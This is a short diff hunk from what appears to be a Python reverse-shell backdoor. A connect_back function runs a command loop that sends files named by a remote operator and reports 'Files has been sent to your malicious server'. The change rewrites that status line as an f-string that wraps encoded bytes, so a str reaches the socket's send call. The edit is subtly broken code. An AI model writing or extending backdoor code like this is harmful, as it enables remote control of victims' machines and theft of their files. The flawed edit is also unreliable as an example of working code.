@@ -53,7 +53,7 @@ def connect_back():
             if cmd.startswith("send"):
                 args_files = cmd.split()
                 send_files(args_files)
-                s.send("Files has been sent to your malicious server".encode("utf-8"))
+                s.send(f"{"Files has been sent to your malicious server".encode("utf-8")}\n")
                 continue
             if cmd.lower() == "exit":
                 break
